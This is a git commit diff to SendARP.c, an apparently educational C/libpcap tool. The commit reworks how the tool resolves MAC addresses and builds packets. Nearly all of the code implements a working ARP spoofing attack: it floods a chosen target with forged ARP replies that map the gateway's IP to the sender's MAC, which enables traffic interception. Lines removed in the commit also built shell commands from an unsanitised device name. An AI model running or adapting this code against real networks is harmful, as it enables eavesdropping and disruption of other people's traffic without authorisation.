f623cedd84f284078a766600628f24e149a8d3cd
kminchul <k.minchul95@gmail.com>
2016-07-22 20:25:45 +0900

    ConvertIP2MAC을 ARP Request로 수정. myAddr과 gatewayIP에 싱글톤 적용

--- SendARP.c
+++ SendARP.c
@@ -7,48 +7,46 @@
 //for structure
 #include <netinet/ether.h>
 #include <arpa/inet.h>
+//custom headerfile
+#include "getLocalAddress.h"
 
 void init_pcd(pcap_t **pcd, char **dev);
-void getMyAddress(const char *dev, struct in_addr *myIP, struct ether_addr *myMAC);
-void getGatewayIP(const char *dev, struct in_addr *gatewayIP);
-int  convertIP2MAC(const char *dev, const struct in_addr IP, struct ether_addr *MAC);
+int  convertIP2MAC(pcap_t *pcd, const struct in_addr IP, struct ether_addr *MAC);
 void sendFakeARP(pcap_t *pcd, const struct in_addr targetIP, const struct ether_addr targetMAC,
                               const struct in_addr fakeIP,   const struct ether_addr fakeMAC);
+void makeARPpacket(u_char *packet, const struct in_addr sendIP, const struct ether_addr sendMAC,
+                                   const struct in_addr recvIP, const struct ether_addr recvMAC, uint16_t ARPop);
 
 int main(int argc, char **argv)
 {
     pcap_t *pcd;
     char *dev;
 
-    struct in_addr      myIP,  targetIP,  gatewayIP;
-    struct ether_addr   myMAC, targetMAC;
+    struct in_addr      targetIP;
+    struct ether_addr   targetMAC; 
 
     // init
+    printf("pcd init ...");
     init_pcd(&pcd, &dev);
-    printf("pcd init ...done.\n");
+    printf("done\n");
 
     // check input and specify target
+    printf("getting target's MAC address ...");
     if(inet_aton(argv[1], &targetIP)==0)
     {
-        printf("Error: invalid IP : %s \n", argv[1]);
+        printf("\nError: invalid IP : %s \n", argv[1]);
         exit(1);
     }
-    if(convertIP2MAC(dev, targetIP, &targetMAC)==-1)
+    if(convertIP2MAC(pcd, targetIP, &targetMAC)==-1)
     {
-        printf("Error: given IP(%s) is not in the ARP table.\n", argv[1]);
+        printf("\nError: given IP(%s) is not in the same network.\n", argv[1]);
         exit(1);
     }
-    printf("got target's MAC address ...done\n");
-
-    // get info. for counterfeit
-    getMyAddress(dev, &myIP, &myMAC);
-    getGatewayIP(dev, &gatewayIP);
-
-    printf("got Gateway info. ...done\n\n");
+    printf("done.\n");
 
     // send fake ARP
     printf("start sending fake ARP\n");    
-    sendFakeARP(pcd, targetIP, targetMAC, gatewayIP, myMAC);
+    sendFakeARP(pcd, targetIP, targetMAC, getGatewayIP(), getMyAddr().MAC);
 
     return 0;
 }
@@ -56,36 +54,14 @@ int main(int argc, char **argv)
 void sendFakeARP(pcap_t *pcd, const struct in_addr targetIP, const struct ether_addr targetMAC,
                               const struct in_addr fakeIP,   const struct ether_addr fakeMAC)
 {
-    const int ETHER_LEN = sizeof(struct ether_header);
-    const int ARP_LEN   = sizeof(struct ether_arp);
-    u_char packet[ETHER_LEN + ARP_LEN];
-    struct ether_header etherHdr;
-    struct ether_arp arpHdr;
+    u_char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
 
-    // Ethernet part
-    etherHdr.ether_type = htons(ETHERTYPE_ARP);
-    memcpy(etherHdr.ether_dhost, &targetMAC.ether_addr_octet, ETHER_ADDR_LEN);
-    memcpy(etherHdr.ether_shost, &fakeMAC.ether_addr_octet, ETHER_ADDR_LEN);
-
-    // ARP part
-    arpHdr.arp_hrd = htons(ARPHRD_ETHER);
-    arpHdr.arp_pro = htons(ETHERTYPE_IP);
-    arpHdr.arp_hln = ETHER_ADDR_LEN;
-    arpHdr.arp_pln = sizeof(in_addr_t);
-    arpHdr.arp_op  = htons(ARPOP_REPLY);
-    memcpy(&arpHdr.arp_sha, &fakeMAC.ether_addr_octet, ETHER_ADDR_LEN);
-    memcpy(&arpHdr.arp_spa, &fakeIP.s_addr, sizeof(in_addr_t));
-    memcpy(&arpHdr.arp_tha, &targetMAC.ether_addr_octet, ETHER_ADDR_LEN);
-    memcpy(&arpHdr.arp_tpa, &targetIP.s_addr, sizeof(in_addr_t));
-
-    // build packet
-    memcpy(packet, &etherHdr, ETHER_LEN);
-    memcpy(packet+ETHER_LEN, &arpHdr, ARP_LEN);
+    makeARPpacket(packet, fakeIP, fakeMAC, targetIP, targetMAC, ARPOP_REPLY);
 
     while(1)
     {
-        // send
-        if(pcap_inject(pcd,packet,sizeof(packet))==-1)
+        // sending
+        if(pcap_inject(pcd, packet, sizeof(packet))==-1)
         {
             pcap_perror(pcd,0);
             pcap_close(pcd);
@@ -110,7 +86,7 @@ void init_pcd(pcap_t **pcd, char **dev)
         exit(1);
     }
     
-    *pcd = pcap_open_live(*dev, BUFSIZ,  1/*PROMISCUOUS*/, -1, errbuf);
+    *pcd = pcap_open_live(*dev, BUFSIZ,  0/*NONPROMISCUOUS*/, -1, errbuf);
 
     if (*pcd == NULL)
     {
@@ -121,71 +97,89 @@ void init_pcd(pcap_t **pcd, char **dev)
     return;
 }
 
-
-void getGatewayIP(const char *dev, struct in_addr *gatewayIP)
+int convertIP2MAC(pcap_t *pcd, const struct in_addr IP, struct ether_addr *MAC)
 {
-    FILE* fp;
-    char cmd[256] = {0x0};
-    char IPbuf[20] = {0x0};
+    int status;
+    struct ether_addr BcastMAC;
+    struct ether_header *etherHdr;
+    struct ether_arp *arpHdr;
 
-    sprintf(cmd,"route -n | grep '%s'  | grep 'UG' | awk '{print $2}'", dev);
-    
-    fp = popen(cmd, "r");
-    fgets(IPbuf, sizeof(IPbuf), fp);
-    pclose(fp);
+    struct pcap_pkthdr *recvHeader;
+    const u_char *recvPacket;
+    u_char sendPacket[sizeof(struct ether_header) + sizeof(struct ether_arp)];
 
-    inet_aton(IPbuf, gatewayIP);
-
-    return;
-}
-
-void getMyAddress(const char *dev, struct in_addr *myIP, struct ether_addr *myMAC)
-{
-    FILE* fp;
-    char cmd[256] = {0x0};
-    char MACbuf[20] = {0x0}, IPbuf[20] = {0x0};
-    
-    // get MAC info    
-    sprintf(cmd,"ifconfig | grep '%s' | awk '{print $5}'", dev);
-    
-    fp = popen(cmd, "r");
-    fgets(MACbuf, sizeof(MACbuf), fp);
-    pclose(fp);
-
-    ether_aton_r(MACbuf, myMAC);
-
-    // get IP info
-    sprintf(cmd,"ifconfig | grep -A 1 '%s' | grep 'inet addr' | awk '{print $2}' | awk -F':' '{print $2}'", dev);
-    
-    fp = popen(cmd, "r");
-    fgets(IPbuf, sizeof(IPbuf), fp);
-    pclose(fp);
-
-    inet_aton(IPbuf, myIP);
-
-    return;
-}
-
-int convertIP2MAC(const char *dev, const struct in_addr IP, struct ether_addr *MAC)
-{
-    FILE* fp;
-    char cmd[256] = {0x0};
-    char IPbuf[20] = {0x0}, MACbuf[20] = {0x0};
-
-    inet_ntop(AF_INET, &IP, IPbuf, sizeof(IPbuf));
-
-    //get MAC address from ARP table
-    sprintf(cmd, "ping -c 1 %s > /dev/null", IPbuf);
-    system(cmd);
-    sprintf(cmd,"arp | grep '%s' | grep '%s' | awk '{print $3}'", dev, IPbuf);
-    fp = popen(cmd, "r");
-    fgets(MACbuf, sizeof(MACbuf), fp);
-    pclose(fp);
-
-    if(strlen(MACbuf)<5) // to include LF, CR, or CRLF
+    // check if it's in the same network
+    if((getMyAddr().IP.s_addr & getMyAddr().subMask.s_addr)
+         != (IP.s_addr & getMyAddr().subMask.s_addr))
         return -1;
 
-    ether_aton_r(MACbuf, MAC);
+    // make ARP REQUEST packet
+    ether_aton_r("ff:ff:ff:ff:ff:ff", &BcastMAC);
+    makeARPpacket(sendPacket, getMyAddr().IP, getMyAddr().MAC, IP, BcastMAC, ARPOP_REQUEST);
+    
+    // send and get ARP response
+    while(1)
+    {
+        // send Request
+        if(pcap_inject(pcd, sendPacket, sizeof(sendPacket))==-1)
+        {
+            pcap_perror(pcd,0);
+            pcap_close(pcd);
+            exit(1);
+        }
+
+        // get Response
+        status = pcap_next_ex(pcd, &recvHeader, &recvPacket);
+        if(status!=1)
+            continue;
+
+        // check if it's ARP packet
+        etherHdr = (struct ether_header*)recvPacket;
+        if(etherHdr->ether_type!=htons(ETHERTYPE_ARP))
+            continue;
+        
+        // check if it's 1)ARP Reply 2)from the desired source
+        arpHdr = (struct ether_arp*)(recvPacket + sizeof(struct ether_header));
+        if(arpHdr->arp_op != htons(ARPOP_REPLY))
+            continue;
+        if(memcmp(&arpHdr->arp_spa, &IP.s_addr, sizeof(in_addr_t))!=0)
+            continue;
+
+        // if so, copy MAC addr
+        memcpy(&MAC->ether_addr_octet, &arpHdr->arp_sha, ETHER_ADDR_LEN);
+
+        break;
+    }
+
 
     return 0;
+}
+
+void makeARPpacket(u_char *packet, const struct in_addr sendIP, const struct ether_addr sendMAC,
+                                   const struct in_addr recvIP, const struct ether_addr recvMAC, uint16_t ARPop)
+{
+    struct ether_header etherHdr;
+    struct ether_arp arpHdr;
+
+    // Ethernet part
+    etherHdr.ether_type = htons(ETHERTYPE_ARP);
+    memcpy(etherHdr.ether_dhost, &recvMAC.ether_addr_octet, ETHER_ADDR_LEN);
+    memcpy(etherHdr.ether_shost, &sendMAC.ether_addr_octet, ETHER_ADDR_LEN);
+
+    // ARP part
+    arpHdr.arp_hrd = htons(ARPHRD_ETHER);
+    arpHdr.arp_pro = htons(ETHERTYPE_IP);
+    arpHdr.arp_hln = ETHER_ADDR_LEN;
+    arpHdr.arp_pln = sizeof(in_addr_t);
+    arpHdr.arp_op  = htons(ARPop);
+    memcpy(&arpHdr.arp_sha, &sendMAC.ether_addr_octet, ETHER_ADDR_LEN);
+    memcpy(&arpHdr.arp_spa, &sendIP.s_addr, sizeof(in_addr_t));
+    memcpy(&arpHdr.arp_tha, &recvMAC.ether_addr_octet, ETHER_ADDR_LEN);
+    memcpy(&arpHdr.arp_tpa, &recvIP.s_addr, sizeof(in_addr_t));
+
+    // build packet
+    memcpy(packet, &etherHdr, sizeof(struct ether_header));
+    memcpy(packet+sizeof(struct ether_header), &arpHdr, sizeof(struct ether_arp));
+
+    return;
 }
